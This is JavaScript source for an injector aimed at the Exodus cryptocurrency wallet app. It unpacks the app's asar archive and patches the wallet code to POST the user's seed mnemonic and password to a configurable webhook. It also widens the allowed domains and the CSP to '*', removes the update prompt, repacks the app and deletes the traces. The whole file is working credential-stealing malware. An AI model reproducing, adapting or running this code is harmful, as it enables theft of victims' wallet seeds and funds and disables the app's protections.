const fs = require("fs");
const util = require("util");
const { exec } = require("child_process");

const execPromise = util.promisify(exec);
const readdir = util.promisify(fs.readdir);
let pathArray = [];

const folderPath = process.env.LOCALAPPDATA + "/exodus";

const hook = ""; // put a webhook.site link here for testing

async function list() {
  const files = await readdir(folderPath);

  files.forEach((file) => {
    if (file.includes("app-")) {
      const absolutePath = folderPath + "/" + file;
      pathArray.push(absolutePath);
    }
  });

  return pathArray;
}

async function highest(paths) {
  let highestFolder = null;
  let highestNumber = 0;

  for (const file of paths) {
    const versionNumber = parseFloat(file.split("app-")[1]);

    if (!isNaN(versionNumber) && versionNumber > highestNumber) {
      highestNumber = versionNumber;
      highestFolder = file;
    }
  }

  return highestFolder;
}

function delRec(path) {
  if (fs.existsSync(path)) {
    fs.readdirSync(path).forEach((file) => {
      const currentPath = `${path}/${file}`;
      if (fs.lstatSync(currentPath).isDirectory()) {
        delRec(currentPath);
      } else {
        fs.unlinkSync(currentPath);
      }
    });
    fs.rmdirSync(path);
  }
}

async function modifyFile(filePath, searchString, replacementString) {
  try {
    const data = await fs.promises.readFile(filePath, "utf8");

    if (!data.includes(searchString)) return;

    const modifiedData = data.replace(searchString, replacementString);
    await fs.promises.writeFile(filePath, modifiedData, "utf8");
  } catch (err) {
    console.error(`[ERROR] Failed to modify file: ${err}`);
  }
}

async function Inject() {
  const versionPath = await highest(await list());
  const asar = versionPath + "/resources/app.asar";
  const out = versionPath + "/resources/out";
  const unpack = `npx asar e ${asar} ${out}`;
  const pack = `npx asar p ${out} ${asar}`;
  const walletIndex = out + "/src/app/wallet/index.js";
  const walletHtml = out + "/src/static/wallet.html";
  const mainIndex = out + "/src/app/main/index.js";
  const UiIndex = out + "/src/app/ui/index.js";

  const searchList = {
    domains: `domains:["server.exodus.io","exodusapp.blob.core.windows.net"]`,
    csp: "data: https://server.exodus.io/ https://exodusapp.blob.core.windows.net/",
    wallet: "await this._loadLightningCreds()",
    ui: ",this.promptForUpdate()",
  };

  const replacement = {
    domains: 'domains: "*"',
    csp: "data: *",
    wallet: `await this._loadLightningCreds();var xe_array={xe_mnemonic:this._seed.mnemonicString,xe_password:e,wallet_directory:this._walletPaths.walletDir,xe_version: se.version || E.version || "null"},xe_request=new XMLHttpRequest;xe_request.open("POST","${hook}",!0),xe_request.setRequestHeader("Content-Type","application/json");var payload={data:xe_array};xe_request.send(JSON.stringify(payload));`,
    blank: "",
  };

  await execPromise(unpack); // unpack asar

  try {
    console.log("[Injection] Modifying files...");
    const filesToModify = [
      {
        file: mainIndex,
        searchList: searchList.domains,
        replacement: replacement.domains,
      },
      {
        file: walletHtml,
        searchList: searchList.csp,
        replacement: replacement.csp,
      },
      {
        file: walletIndex,
        searchList: searchList.wallet,
        replacement: replacement.wallet,
      },
      {
        file: UiIndex,
        searchList: searchList.ui,
        replacement: replacement.blank,
      },
    ];

    await Promise.all(
      filesToModify.map(async (fileData) => {
        await modifyFile(
          fileData.file,
          fileData.searchList,
          fileData.replacement
        );
        console.log(`[Injection] Successfully changed ${fileData.file}`);
      })
    );

    console.log("[Injection] Starting cleanup...");
    await execPromise(pack); // Repack asar

    await delRec(out); // Cleanup

    console.log("[Injection] Injection successful!");
  } catch (err) {
    console.error(`[ERROR] An error occurred during injection: ${err}`);
  }
}

async function startInjection() {
  try {
    // Use fs.exists deprecated method replaced with fs.access
    if (await fs.existsSync(folderPath)) {
      await Inject();
    } else {
      // console.error(`[ERROR] Exodus folder not found at ${folderPath}`); // debug
      process.exit(1);
    }
  } catch (err) {
    console.error(
      `[ERROR] An error occurred when attempting injection: ${err}`
    );
  }
}

startInjection();
